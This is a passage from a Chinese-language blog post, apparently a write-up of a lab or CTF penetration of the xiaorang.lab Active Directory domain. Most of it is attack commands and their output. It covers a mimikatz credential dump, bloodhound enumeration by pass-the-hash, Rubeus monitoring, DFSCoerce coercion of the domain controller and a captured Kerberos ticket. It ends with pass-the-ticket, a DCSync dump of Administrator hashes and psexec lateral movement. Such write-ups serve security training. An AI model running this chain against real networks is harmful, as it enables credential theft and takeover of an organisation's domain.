<span class="m">72</span> d3 <span class="m">36</span> d3 3a a9 0d 3f b9 <span class="m">00</span> ef 3e <span class="m">90</span> d9 <span class="m">36</span> a2 ad <span class="m">36</span> 2a <span class="m">22</span> <span class="nb">cd</span> a0 cc 5b f4 0e a4 6b d3 <span class="m">24</span> 8e 6e <span class="m">99</span> <span class="m">59</span> <span class="m">96</span> d9 f8 a7 <span class="m">26</span> <span class="m">09</span> <span class="m">58</span> 0a c2 3a <span class="m">69</span> <span class="m">56</span> <span class="m">76</span> <span class="m">40</span> b9 <span class="m">10</span> <span class="m">92</span> a7 5c aa 3d e1 d0 1f
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">999</span> <span class="o">(</span>00000000:000003e7<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : UndefinedLogonType from <span class="m">0</span>
+</span></span><span class="line"><span class="cl">User Name         : WIN19$
+</span></span><span class="line"><span class="cl">Domain            : XIAORANG
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/17 20:38:29
+</span></span><span class="line"><span class="cl">SID               : S-1-5-18
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : win19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG.LAB
+</span></span><span class="line"><span class="cl">         * Password : db 7f 9c d2 2b fa de 0a 9f <span class="m">71</span> <span class="m">77</span> <span class="m">11</span> <span class="m">54</span> <span class="m">59</span> <span class="nb">fc</span> <span class="m">86</span> 9f d5 b8 1d <span class="m">12</span> ff <span class="m">70</span> a2 f3 e1 1a <span class="m">67</span> 0f <span class="m">50</span> db <span class="m">41</span> ad 0b <span class="m">25</span> b1 <span class="m">63</span> <span class="m">42</span> <span class="m">05</span> 3a 0f 5f fe 8a <span class="m">70</span> b4 b4 6c <span class="m">07</span> <span class="m">05</span> <span class="m">05</span> a1 a1 <span class="m">08</span> a5 <span class="m">56</span> e7 <span class="m">50</span> <span class="m">96</span> 8c <span class="m">46</span> 9a ee <span class="m">91</span> 0b <span class="m">89</span> 6a <span class="m">47</span> 4a <span class="m">18</span> c3 4f f0 ca <span class="m">77</span> <span class="m">76</span> <span class="m">13</span> <span class="m">70</span> <span class="m">10</span> <span class="m">62</span> <span class="m">45</span> d7 fe b8 <span class="m">76</span> <span class="m">81</span> <span class="nb">cd</span> 9e cc ae a1 0e c7 <span class="m">21</span> <span class="m">17</span> fb 5e ef 3e f9 a0 4b 8b <span class="m">44</span> 8a 1f a7 7a <span class="m">63</span> <span class="m">66</span> <span class="m">62</span> 4c 8b <span class="m">12</span> b2 <span class="m">31</span> <span class="m">96</span> <span class="m">30</span> <span class="m">49</span> c0 <span class="m">98</span> 6a 6f <span class="m">39</span> 3c bb <span class="m">75</span> <span class="m">96</span> <span class="m">83</span> <span class="m">24</span> b1 b2 <span class="m">83</span> <span class="m">88</span> <span class="m">27</span> 9e ce <span class="nb">cd</span> e0 2d 9a <span class="m">77</span> <span class="m">93</span> <span class="m">78</span> 5f f5 7b d1 8c <span class="m">39</span> 8b <span class="m">68</span> 8e c7 <span class="m">87</span> <span class="m">92</span> <span class="m">97</span> e4 2a <span class="m">77</span> <span class="m">99</span> db 8a 5f 1b <span class="m">93</span> cb ca f8 <span class="m">42</span> <span class="m">65</span> 0b <span class="m">49</span> 7d <span class="m">76</span> b2 3b <span class="nb">fc</span> <span class="m">82</span> c8 <span class="m">32</span> a1 2f bd c0 <span class="m">48</span> b3 d8 b6 <span class="m">72</span> e5 <span class="m">80</span> b0 9a bf <span class="m">02</span> <span class="nb">fc</span> eb 7d <span class="m">24</span> <span class="m">19</span> f0 <span class="m">17</span> <span class="m">46</span> <span class="m">53</span> <span class="m">01</span> ee <span class="m">81</span> 7e 4b e4 <span class="m">14</span> <span class="m">23</span> <span class="m">59</span> 3b <span class="m">05</span> <span class="m">18</span> <span class="nb">fc</span> c0 0d <span class="m">04</span> d7 <span class="m">56</span> f6 <span class="m">90</span> 8c ad e4 <span class="m">67</span> 0c b8 <span class="m">50</span> f6 <span class="m">98</span> ae 1f e4 c5 <span class="m">49</span> d6
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>真是一场酣畅淋漓的卡顿</p>
+<p><code>Win19$</code>的NTML<code>68d660f11c6854d1df763d120f3b6225</code></p>
+<p>看看关系</p>
+<p><code>p4 bloodhound-python -u win19$ --hashes &quot;aad3b435b51404eeaad3b435b51404ee:68d660f11c6854d1df763d120f3b6225&quot; -d xiaorang.lab -dc dc01.xiaorang.lab -c all --dns-tcp -ns 172.22.4.7 --auth-method ntlm --zip</code></p>
+<p>发现非约束委派</p>
+<p><code>Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$</code></p>
+<p>以管理员运行</p>
+<p><code>p4 python3 dfscoerce.py -u win19$ -hashes &quot;aad3b435b51404eeaad3b435b51404ee:68d660f11c6854d1df763d120f3b6225&quot; -d xiaorang.lab win19 172.22.4.7</code></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] 2024/4/17 16:03:18 UTC - Found new TGT:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  User                  :  DC01$@XIAORANG.LAB
+</span></span><span class="line"><span class="cl">  StartTime             :  2024/4/17 20:39:00
+</span></span><span class="line"><span class="cl">  EndTime               :  2024/4/18 6:39:00
+</span></span><span class="line"><span class="cl">  RenewTill             :  2024/4/24 20:39:00
+</span></span><span class="line"><span class="cl">  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+</span></span><span class="line"><span class="cl">  Base64EncodedTicket   :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD5+U4UF7DbmjvJDHFTVfTwxXcvyLH/PwX45bX5MyyHwK/0C7qs0VlW+s3yPcx0xGKd2zQx1QSMeLTySggflmj5IniBYfG3RQSqh39CBkeL2TC5dubS+vCTkMd8ciq4BsZx+O2vOOEp/z86Wvo6R9C9Iory93dn1RPny+VNpZp50KQAhO4q+Lx+Yi+j8x/sPPCmPNzG+Gt8BRv2xtFUOVKSKZ9Uq5T3MzKPNLmDkZwIsAhDmuhiREIFbJinz+SW1u5eiUFsV2w1ecp6fXIn+yAywbClLzjIf2pB9t2+H8EJdiUhW+BIy+6FF+3ROIeTGOWYuVWWrTOFgsTZJsvcYkC2PK9eG51NbiV3fKIR4Xh0S2qZrhF2xaVLuawGqEzU0D0aMfgJRwWOeHJ9G/o1pvqXwUqEZEvQL4gGdwTqKmEMTytNSDF2Rr3UPdB01sz3fUUdNWi77WPNYeTl1t0TXF9LJpCetRvhKyZuraY7W9pT4pMkTscsDsFgJ/af05jvsVgTh7UyVhnmfY8jelPh9a5W0DLcE5CrM6Cn8Me7ewWZSiGciPOsGJUyjZJu8PjA9JEGn799FDJQ0QY6MqKraiRkRhdis9UEw4yNS1dU+1Okax4sCtuxfWp5+Mev9q/48cDDGYq2bTdWvofm8NdbeALYrSEhuzYCgI4A160EEQIU/cyX4Jo0c86eRpcvNYXxOyQVgkagTyu8V5PbnfW1YZn93rkBxx69vaEOLXZXv4EKg8JjmtALryB100jjyqyxVBeTMz5ad7PcgNQAnPYiFxI+uPYqQ4NTWym8Rty5Qj7Z7AkI1WqPv+8WZGW+6pofyNtORcZgeqf8ApRUuI28yz8ypgfzw8KRvA7WvDTKloZ58lQwiAB7vqecj4jSyqDSIqYTj2H5OaTQuvgIAmybr/H4GFfiMrLAfvBUavFY4NFkzpvhuJ3p7lEZ0l57EYNNayfFFwol/lM/IOWExhMdhXGwMAZJq3pbmldElwvtiIl2Dxk/TBJ0CSH4E/V2chyiIU2ao0zbqOZzIegf1a+Pslxvie9qFsxLxRiwONk8kJe9089JDub6HFy3gZqrGaZ+3SDCOkEiQi/vU5QF5SBo9kLCS+E18d036Hn1Ptot9hDZrLtakYTfNFz8KHFNYMtJhEAY1sSSLJHa9ire6Trc9uuqOz0k5MntvSc8Ld7RTUPp0R/igJhyFUUpkL06Tp5PjrSbyANOSobtu3q4nC9QrSIecbe2h/lzhMgUNnrTSsWIaUxnDMcXR7sGOp5hrBzvpBFtBLyEV0f8a3GwCPlhkKh2zzs/fFSpKMtzQ0+87Vy66rRLY9ZckWWkpUGBzEpgpfC2xe9WPyjSlODmXpATHCkWtYU7hUDIi9TQ3aSQXZwBgumJ+BMlo4a8+0ydQKW3LpE/3pI1g9kvHk65QQal7HClp4GUVmKTXwRaLbbFmykKjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCDIaQT75jILd8TQz4ZSEDG0JBW8ImwfFYtDDrpMw09NHKEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI0MDQxNzEyMzkwMFqmERgPMjAyNDA0MTcyMjM5MDBapxEYDzIwMjQwNDI0MTIzOTAwWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Ticket cache size: 1
+</span></span></code></pre></div></div><p>票据</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">mimikatz # kerberos::purge
+</span></span><span class="line"><span class="cl">Ticket(s) purge for current session is OK
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mimikatz # kerberos::ptt DC01.kirbi
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">* File: &#39;DC01.kirbi&#39;: OK
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mimikatz # lsadump::dcsync /domain:xiaorang.lab /user:administrator
+</span></span><span class="line"><span class="cl">[DC] &#39;xiaorang.lab&#39; will be the domain
+</span></span><span class="line"><span class="cl">[DC] &#39;DC01.xiaorang.lab&#39; will be the DC server
+</span></span><span class="line"><span class="cl">[DC] &#39;administrator&#39; will be the user account
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Object RDN           : Administrator
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">** SAM ACCOUNT **
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SAM Username         : Administrator
+</span></span><span class="line"><span class="cl">Account Type         : 30000000 ( USER_OBJECT )
+</span></span><span class="line"><span class="cl">User Account Control : 00000200 ( NORMAL_ACCOUNT )
+</span></span><span class="line"><span class="cl">Account expiration   : 1601/1/1 8:00:00
+</span></span><span class="line"><span class="cl">Password last change : 2024/4/17 20:38:54
+</span></span><span class="line"><span class="cl">Object Security ID   : S-1-5-21-1913786442-1328635469-1954894845-500
+</span></span><span class="line"><span class="cl">Object Relative ID   : 500
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Credentials:
+</span></span><span class="line"><span class="cl">  Hash NTLM: 4889f6553239ace1f7c47fa2c619c252
+</span></span><span class="line"><span class="cl">    ntlm- 0: 4889f6553239ace1f7c47fa2c619c252
+</span></span><span class="line"><span class="cl">    ntlm- 1: 4889f6553239ace1f7c47fa2c619c252
+</span></span><span class="line"><span class="cl">    ntlm- 2: 4889f6553239ace1f7c47fa2c619c252
+</span></span><span class="line"><span class="cl">    ntlm- 3: 4889f6553239ace1f7c47fa2c619c252
+</span></span><span class="line"><span class="cl">    lm  - 0: 5ed5f141fa1b3fc4b0c0854a8c70c5e5
+</span></span><span class="line"><span class="cl">    lm  - 1: 72ba3d46a4562df2771082395b753718
+</span></span><span class="line"><span class="cl">    lm  - 2: 904ed983ef0d9dbf76893f35dbabce6a
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Supplemental Credentials:
+</span></span><span class="line"><span class="cl">* Primary:NTLM-Strong-NTOWF *
+</span></span><span class="line"><span class="cl">    Random Value : 693fd9fc2bc183788149603913298299
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">* Primary:Kerberos-Newer-Keys *
+</span></span><span class="line"><span class="cl">    Default Salt : XIAORANG.LABAdministrator
+</span></span><span class="line"><span class="cl">    Default Iterations : 4096
+</span></span><span class="line"><span class="cl">    Credentials
+</span></span><span class="line"><span class="cl">      aes256_hmac       (4096) : 23b87fd9c4a80c58fb0d71e2a0d5fc82b7de27156d039ad791093aa88ca95eb3
+</span></span><span class="line"><span class="cl">      aes128_hmac       (4096) : 3a4807b53f305c84603ff072655a5c42
+</span></span><span class="line"><span class="cl">      des_cbc_md5       (4096) : 64feb058753bf1a2
+</span></span><span class="line"><span class="cl">    OldCredentials
+</span></span><span class="line"><span class="cl">      aes256_hmac       (4096) : 23b87fd9c4a80c58fb0d71e2a0d5fc82b7de27156d039ad791093aa88ca95eb3
+</span></span><span class="line"><span class="cl">      aes128_hmac       (4096) : 3a4807b53f305c84603ff072655a5c42
+</span></span><span class="line"><span class="cl">      des_cbc_md5       (4096) : 64feb058753bf1a2
+</span></span><span class="line"><span class="cl">    OlderCredentials
+</span></span><span class="line"><span class="cl">      aes256_hmac       (4096) : 23b87fd9c4a80c58fb0d71e2a0d5fc82b7de27156d039ad791093aa88ca95eb3
+</span></span><span class="line"><span class="cl">      aes128_hmac       (4096) : 3a4807b53f305c84603ff072655a5c42
+</span></span><span class="line"><span class="cl">      des_cbc_md5       (4096) : 64feb058753bf1a2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">* Primary:Kerberos *
+</span></span><span class="line"><span class="cl">    Default Salt : XIAORANG.LABAdministrator
+</span></span><span class="line"><span class="cl">    Credentials
+</span></span><span class="line"><span class="cl">      des_cbc_md5       : 64feb058753bf1a2
+</span></span><span class="line"><span class="cl">    OldCredentials
+</span></span><span class="line"><span class="cl">      des_cbc_md5       : 64feb058753bf1a2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">* Packages *
+</span></span><span class="line"><span class="cl">    NTLM-Strong-NTOWF
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">* Primary:WDigest *
+</span></span><span class="line"><span class="cl">    01  1fd4772b6f3fea5f0a5a234dde150efb
+</span></span><span class="line"><span class="cl">    02  70b5ab2d5931d45749e4f10b80a70466
+</span></span><span class="line"><span class="cl">    03  0d71e6115a7e5850b3e4c777aba623df
+</span></span><span class="line"><span class="cl">    04  1fd4772b6f3fea5f0a5a234dde150efb
+</span></span><span class="line"><span class="cl">    05  354a5ce3ca3629c6ca77a73b462c0a7f
+</span></span><span class="line"><span class="cl">    06  a692fc773761b7edf3a3cad332053a85
+</span></span><span class="line"><span class="cl">    07  3b3bf4f20b86e7f890d2a6f748684c86
+</span></span><span class="line"><span class="cl">    08  511be1f8053c22c147fe774e84f6cfa0
+</span></span><span class="line"><span class="cl">    09  5cd37846466bba0ab01d0a4fb8fd421a
+</span></span><span class="line"><span class="cl">    10  5c90774e68ba65b15563d817ea03be1d
+</span></span><span class="line"><span class="cl">    11  1aa618d4990ce0b031f56c35b00ef135
+</span></span><span class="line"><span class="cl">    12  511be1f8053c22c147fe774e84f6cfa0
+</span></span><span class="line"><span class="cl">    13  385ea61fafea315b384cff461b9e114c
+</span></span><span class="line"><span class="cl">    14  ee5a115e84919b46e718c6c4294dba78
+</span></span><span class="line"><span class="cl">    15  729b4c3a8edab7f12e037ec161293f44
+</span></span><span class="line"><span class="cl">    16  e3ff26cc0629c51fc68f18ce47173f45
+</span></span><span class="line"><span class="cl">    17  bd6d0bafad3f99c28a9a18d9e5351763
+</span></span><span class="line"><span class="cl">    18  359507105fa376c918a80f7fb982446a
+</span></span><span class="line"><span class="cl">    19  20ad44fe17377c5f3815358c33ca7c34
+</span></span><span class="line"><span class="cl">    20  330fb8b3848b024ba40a8cef987d6795
+</span></span><span class="line"><span class="cl">    21  ec544c990f343fe338a4667f3791e5ab
+</span></span><span class="line"><span class="cl">    22  d528c47b4f30acdeb5bf49f49fed7d64
+</span></span><span class="line"><span class="cl">    23  41bb0903f6c2129f27bfa06e6d9b186b
+</span></span><span class="line"><span class="cl">    24  b5c4fc8c656c14829c0da25e0852582a
+</span></span><span class="line"><span class="cl">    25  8bba781aff9bb5e7939f73c216d0e750
+</span></span><span class="line"><span class="cl">    26  d3bb8972f7c7ffbc5b22392125c4e21f
+</span></span><span class="line"><span class="cl">    27  dd97e0d53b5d1ae346029810cf74d0b8
+</span></span><span class="line"><span class="cl">    28  0c084ded5672573ee7c4127ab474f930
+</span></span><span class="line"><span class="cl">    29  c922d791de366eedeb97c1bd0798d6ff
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mimikatz #
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>最后两个横向传递就行</p>
+<p><code>p4 python3 psexec.py -hashes :4889f6553239ace1f7c47fa2c619c252 xiaorang.lab/Administrator@172.22.4.19</code></p>
+</article>
+
+        <nav class="c-post__nav">
+            
+            <a href="/post/go%e8%af%ad%e8%a8%80%e8%ae%be%e8%ae%a1%e6%80%9d%e8%80%83" class="c-post__nav-card c-post__nav-card--prev">
+                <h3>‹ 上一篇</h3>
+                <p class="c-post__nav-title">go语言设计思考</p>
+            </a>
+            
+
+            
+            <a href="/post/initial" class="c-post__nav-card c-post__nav-card--next">
+                <h3>下一篇 ›</h3>
+                <p class="c-post__nav-title">Initial</p>
+            </a>
+            
+        </nav>
+    </div>
+</div>
+
+    </main>
+    <footer class="c-footer">
+        <span id="jinrishici-sentence" class="c-footer__quote">今日诗词加载中....</span>
+        <div class="c-footer__copy">
+            Copyright © <span id="currentYear">2025</span> Dionysus. All rights reserved.
+        </div>
+    </footer>
+</div>
+
+<div id="algolia-search-mask" class="c-search-mask"></div>
+<div id="algolia-search-modal" class="c-search-modal">
+    <div class="c-search-modal__box">
+        <div class="c-search-modal__header">搜索</div>
+        <div class="c-search-modal__summary" id="algolia-search-summary" style="display:none;">共找到 0 条结果</div>
+        <input type="text" id="algolia-search-input" class="c-search-modal__input" placeholder="请输入关键词..." />
+        <div id="algolia-search-results" class="c-search-modal__results"></div>
+        <div id="algolia-pagination" class="c-search-modal__pagination"></div>
+        <hr class="c-search-modal__divider" />
+    </div>
+</div>
+
+<script src='https://static.dionysus.zip/static/js/app-IJHRYWUS.js' defer></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js" defer></script>
+<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8" defer></script>
+</body>
+</html>
+
